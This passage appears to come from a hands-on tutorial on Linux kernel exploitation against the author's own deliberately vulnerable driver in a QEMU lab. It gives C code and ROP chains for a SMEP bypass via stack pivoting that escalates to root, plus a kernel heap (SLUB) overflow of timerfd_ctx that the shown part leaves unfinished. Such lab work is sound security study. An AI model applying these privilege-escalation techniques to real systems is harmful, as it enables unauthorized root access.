#define IOCTL_FUNC      	_IOWR(IOCTL_MAGIC, 2, unsigned long)
```  
For the sake of simplicity we can include this header into our exploit, so we can invoke these commands through ioctl.  
### Bypass SMEP with stack pivoting  
Stack pivoting is a technique, which makes possible, to perform a ROP chain without overwriting anythin after the first return pointer on the stack. So we could do the following exploit using a simple buffer overflow, but we are gonna use instead the function pointer ioctl command in our kernel driver. 
The base of stack pivoting is a stack lift. This means, we are modifying the pointer in `rsp` into another place of the memory, which we can control. For this, we need to find a ROP gadget, which moves a constant value into the stack register, preferably one, that is a user space memory address, and which we can allocate using mmap. `mmap` has a minimum address, and below that we cannot allocate memory. We can find this with the following command:  
```
# cat /proc/sys/vm/mmap_min_addr 
4096
```  
So we need a gadget, that moves a value bigger than 0x1000 into rsp, but it should be low enough to be an userland address. After some search we can find a perfect address:  
`0xffffffff81458a59 : mov esp, 0x5b000000 ; pop rbp ; ret`  
So, we can add this address to our other ROP addresses, and send this as our payload to the device file.  
```C
unsigned long stacklift = 0xffffffff81458a59;
...
ret = ioctl(fd, IOCTL_FUNC, stacklift);
if(ret < 0){
	printf("[-] Failed to write to run function\n");
        exit(-1);
}
```  
After this we need to mmap this address with some space (I used a whole page, so 0x1000 bytes), and fill it with our ROP gadgets from the previous exploit.  
```C
void create_rop_mem(){
    printf("[+] Creating ROP chain on memory...\n");
    unsigned long *mem = mmap((void*)newstack, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned int off = 0;
    mem[off++] = 0x1337;
    mem[off++] = pop_rdi_ret; // pop rdi; ret;
    mem[off++] = 0; // to rdi
    mem[off++] = prepare_kernel_cred;
    mem[off++] = pop_rdx_ret; // pop rdx; ret;
    mem[off++] = 8; // to rdx
    mem[off++] = cmp_rdx_8_jne_ret; // cmp rdx, 8; jne; ret;
    mem[off++] = mov_rdi_rax_jne_xor_ret; // mov rdi, rax; jne; xor eax, eax; ret;
    mem[off++] = commit_creds;
    mem[off++] = swapgs_nop3_xor_ret; // swapgs; nop; nop; nop; xor rbx, rbx ret;
    mem[off++] = iretq;
    mem[off++] = user_rip;
    mem[off++] = user_cs;
    mem[off++] = user_rflags;
    mem[off++] = user_sp;
    mem[off++] = user_ss;
}
```  
Ok. We are already set. Let's try this exploit. But unluckily, we get a kernel panic:  
```
[+] Sending payload...
[  364.211701] Call func
[  364.212349] traps: PANIC: double fault, error_code: 0x0
[  364.212351] double fault: 0000 [#1] SMP NOPTI
[  364.212352] CPU: 0 PID: 167 Comm: smep Tainted: G           O      5.11.7 #2
[  364.212354] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[  364.212355] RIP: 0010:kmem_cache_alloc+0x5/0x1b0
```  
This is because `prepare_kernel_cred` and `commit_creds` need stack space to work, but we put the top of the stack in the beginning of the allocated memory. We need more space for them. To fix it, we can allocate 2 pages, one before the stacklift address:  
```C
unsigned long *mem = mmap((void*)newstack-0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
mem[0] = 0x31337;
unsigned int off = 0x1000 / 8;
```  
So, we set the starting address 0x1000 (page size) before the stacklift address, and set the size to 0x2000 (2 pages). If we try to run the exploit like this, we will get a double error again, because the first page won't have anything on it, so it won't be moved into the page table. I got around it by putting a dummy value in the beginning of it. Of course, the want the ROP chain in the original stacklift address. Now we can try the exploit again:  
```
# id
uid=1000(user) gid=1000 groups=1000
# ./smep
[+] Opening device file...
[+] Creating ROP chain on memory...
[+] Sending payload...
[  761.051905] Call func
[+] Returned to userland, spawning root shell...
[+] Privilege level successfully escalated, spawning shell...
/home/user # id
uid=0(root) gid=0(root)
```  
Another root shell!!  
##### Note for myself: SAVE THE DAMN STATE!!!

## Heap overflow  
### Heap overflow primitive  
For the next set of exploitations we need to extend our kernel driver with 2 new commands: one, which uses `kmalloc` to allocate memory on the kernel heap, and another one, which uses `kfree` to free up the slab on a given kernel heap address. For this I added two command ID-s to the header file:  
```C
#define IOCTL_KMALLOC	_IOWR(IOCTL_MAGIC, 3, unsigned long)
#define IOCTL_KFREE	_IOWR(IOCTL_MAGIC, 4, unsigned long)
```
To make communication with `KMALLOC` possible, I defined a struct in this header file, which contains a `size` field, which tells how many bytes we want to allocate, and an `addr` field, which will be used by the driver to return the allocated address.  
```C
struct iomalloc{
	size_t size;
	void* addr;
};
```  
The KMALLOC clause of our ioctl function checks, if the given size is under the predefined maximal size (right now 4 * 4096, also 4 pages), then allocates this size using `kmalloc`, which is the heap allocator of the linux kernel, and uses SLUB to allocate this memory.  
```C
case IOCTL_KMALLOC:{
			printk(KERN_INFO "Allocating kernel memory\n");
			
			iom = (struct iomalloc*)arg;

			if(iom->size > MAX_ALLOC)
				return -EOVERFLOW;

			allocated = kmalloc(iom->size, GFP_KERNEL);
			iom->addr = allocated;
			break;
		}
```  
The KFREE clause will only call `kfree` on the passed address.  
```C
case IOCTL_KFREE:{
			printk(KERN_INFO "Freeing kernel memory\n");
			kfree((const void*)arg);
			break;
		}
```  
To test these commands, I wrote a small test program, that allocates memory on the kernel heap, then frees it.  
```C
struct iomalloc *iom = (struct iomalloc*)malloc(sizeof(struct iomalloc));
if(iom == NULL){
	...
}

iom->size = 4096;
iom->addr = NULL;

ret = ioctl(fd, IOCTL_KMALLOC, iom);
if(ret < 0){
	...
}
...
ioctl(fd, IOCTL_KFREE, iom->addr);
```  
This gives the following output:  
```
# id
uid=1000(user) gid=1000 groups=1000
# ./test
[+] Opening device file...
[+] Allocating memory in kernel heap...
[17766.934224] Allocating kernel memory
[+] Address of allocated memory: 0xffff8880043df000
[+] Freeing allocated memory
[17766.936270] Freeing kernel memory
[+] Memory freed
```  
This way we can play around with kernel heap even if we are non-root users. Of course, we need a command to be able to read and write kernel heap. I just made a simple memcpy command for this:  
```C
case IOCTL_HEAP_RW:{
			printk(KERN_INFO "Kernel heap IO\n");
			ioh = (struct ioheap*)arg;
			memcpy(ioh->dest, ioh->src, ioh->size);
			break;
		}
```  
I even made a new structure for this command:  
```C
struct ioheap{
	size_t size;
	void *src;
	void *dest;
};
```  
Using this command in our test program we get the following output:  
```
# id
uid=1000(user) gid=1000 groups=1000
# ./test
[+] Opening device file...
[+] Allocating memory in kernel heap...
[22953.906168] Allocating kernel memory
[+] Address of allocated memory: 0xffff8880043df000
[+] Writing to allocated memory: Hello!
[22953.914409] Kernel heap IO
[22953.916321] Kernel heap IO
[+] Reading from allocated memory: Hello!
[+] Freeing allocated memory
[22953.922445] Freeing kernel memory
[+] Memory freed
```  
### SLUB overflow  
This time we exploit the heap of our kernel driver using the slab allocator of the system. For more info about this allocator pls refer to the links in the links file. Since we are on a modern linux machine, we will use the SLUB allocator. Basically we used it by calling `kmalloc` and `kfree` previously. Now, how do we exploit it?  
We know, that SLUB has linked lists of different sizes and different lists for heavily used kernel structures, like file descriptors. So we need something, that is allocated by the kernel, has a structure, where we can modify the RIP register and something, that uses the general lists. One working candidate is `timerfd_ctx`. It is allocated on the `kmalloc-256` list, and has two possible fields to modify the instruction pointer, more specifically two callback functions. But these functions are mutually exclusive, since the `timerfd_ctx` has an union, that can have one of two structures: `hrtimer` and `alarm`. Since `alarm` contains an `hrtimer` structure, it is easyer to use `hrtimer` for our exploit.  
One hard part of the exploit is, that we need to modify the `timerfd_ctx` struct in such a way, that we do not mess up the whole structure. We need to make sure, that the structure has enough information to be able to arrive to the callback. For this purpose, we need to study the kernel source a bit.  
First, how do we allocate this structure? We can do it with the `timerfd_create` syscall, which has two parameters: a clockid and a flag variable. We only need to provide the clockid. Because we need the struct to use the timer structure, we need to pass `CLOCK_MONOTONIC` macro. So the calling of the function looks like this:  
```C
void create_timer_instance(){
	int tfd;
	struct itimerspec i;

	i.it_interval.tv_sec = 0;
	i.it_interval.tv_nsec = 0;
	i.it_value.tv_sec = 5;
	i.it_value.tv_nsec = 0;

	tfd = timerfd_create(CLOCK_MONOTONIC, 0);
	timerfd_settime(tfd, 0, &i, 0);
}
```  
So we can allocate this structure on the kernel heap now. In real enviornments we would have a problem with putting this structure right after our allocation, but since there are not many programs on this qemu instance, we won't have a problem with it. Now let's get to the structure of `hrtimer`.  
The first element of the hrtimer is a `timerqueue_node` struct, which contains an `rb_node` struct and a 64 bit integer. The `rb_node` contains an `unsigned long` and two pointers. After these elements in hrtimer, we have another 64 bit integer, and then comes the callback function pointer, that we need to overwrite. If we play around with gdb, we can examine this on the stack:  
```
0xffff888004510500:     0xffff888004510500      0xffffc90000227a68
0xffff888004510510:     0xffff888007a1e6a0      0x00000038f005b19d
0xffff888004510520:     0x00000038f005b19d      0xffffffff8122f280
0xffff888004510530:     0xffff888007a1e1c0      0x0000000000000000
0xffff888004510540:     0x0000000000000000      0x0000000000000000
0xffff888004510550:     0x0000000000000000      0x0000000000000000
0xffff888004510560:     0x0000000000000000      0x0000000000000000
0xffff888004510570:     0x0000000000000000      0x0000000000000000
0xffff888004510580:     0xffff888004510600      0x0000000000000000
0xffff888004510590:     0xffff888004510590      0xffff888004510590
0xffff8880045105a0:     0x0000000000000000      0x0000000000000001
0xffff8880045105b0:     0x0000000000000000      0x0000000000000000
0xffff8880045105c0:     0x0000000000000000      0x0000000000000000
0xffff8880045105d0:     0x0000000000000000      0x0000000000000000
0xffff8880045105e0:     0x0000000000000000      0x0000000000000000
0xffff8880045105f0:     0x0000000000000000      0x0000000000000000
//timerfd_ctx from now
0xffff888004510600:     0x0000000000000001      0xffffc90000227a68
0xffff888004510610:     0xffff888007a1e6a0      0x000000404d880b04
0xffff888004510620:     0x000000404d880b04      0xffffffff8122f280
0xffff888004510630:     0xffff888007a1e1c0      0x0000000000000001
0xffff888004510640:     0x0000000000000000      0x0000000000000000
0xffff888004510650:     0x0000000000000000      0x0000000000000000
0xffff888004510660:     0x0000000000000000      0x0000000000000000
0xffff888004510670:     0x0000000000000000      0x0000000000000000
0xffff888004510680:     0x167161eee8f776ec      0x0000000000000000
0xffff888004510690:     0xffff888004510690      0xffff888004510690
0xffff8880045106a0:     0x0000000000000000      0x0000000000000001
0xffff8880045106b0:     0x0000000000000000      0x0000000000000000
0xffff8880045106c0:     0x0000000000000000      0x0000000000000000
0xffff8880045106d0:     0x0000000000000000      0x0000000000000000
0xffff8880045106e0:     0x0000000000000000      0x0000000000000000
0xffff8880045106f0:     0x0000000000000000      0x0000000000000000
```
The first 256 Bytes are the allocated memory that we kmalloc-ed before, full of memory junk. Then comes the timerfd_ctx. As we can see, the before mentioned variables come in order. Our callback pointer is `0xffffffff8122f280`. We need to overwrite that, but keep the original values in the other addresses. To do that, we can allocate our 256 Byte memory, then read 512 Byte from that address. With that we become the content of the previous dump. From that we can retrieve the 5 values we want to preserve, then before sending the payload, setting these values and the return address on the top. This is how it looks like:  
```C
unsigned long target[64] = {0};
unsigned long payload[38] = {0};
unsigned int off = 32;
...
printf("[+] Allocating address...\n");
driver_alloc(iom);
printf("[+] Creating timerfd struct...\n");
create_timer_instance();
printf("[+] Overloading timerfd...\n");
driver_read_write(target, iom->addr, 512);
for(int i = 0; i < 5; i++){
	payload[off] = target[off];
	off++;
}
payload[off] = stacklift;
...
printf("[+] Sending payload to the driver...\n");
driver_read_write(iom->addr, payload, 304);
printf("[+] Triggering timerfd callback...\n");
sleep(5);
```  
The size of 38 for payload is basically the 32 unsigned long values, which is 256, and we need 6 more to overflow the timerfd. The rest of the code is self explanatory. I just wrapped the ioctl calls into functions which take care about error handling too.  
But what do we do with the return address? Basically the stack pivot exploit. I simply copied the necessary parts from the smep bypass, and made a simple rop exploit using mmap and stacklift. Let's run it!  
```
# ./sof                                                                                 
[+] Creating ROP chain on memory...                                                     
[+] Opening device file...                                                              
[+] Allocating address...                                                               
[   23.871856] Allocating kernel memory                                                 
[+] Creating timerfd struct...                                                                                                                                                  
[+] Overloading timerfd...                                                              
[   23.877111] R/W kernel heap                                                          
[+] Sending payload to the driver...                                                    
[   23.882252] R/W kernel heap
[+] Triggering timerfd callback...
[   28.876217] BUG: kernel NULL pointer dereference, address: 0000000000000360
[   28.880444] #PF: supervisor read access in kernel mode
[   28.881646] #PF: error_code(0x0000) - not-present page
[   28.882265] PGD 4526067 P4D 4526067 PUD 450f067 PMD 0 
[   28.882882] Oops: 0000 [#1] SMP NOPTI
[   28.883336] CPU: 0 PID: 0 Comm: swapper/0 Tainted: G           O      5.11.0 #3
[   28.884205] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   28.885254] RIP: 0010:fixup_vdso_exception+0x1d/0xa0
...
```  
Well, that is bad. What happens, is that we wait for the timer to trigger, but it works with an interrupt. With interrupts there is a problem, that it only has page tables for the kernel space memory, not for the user space. So we will never be able to rop from our mmaped memory. We need another solution.  
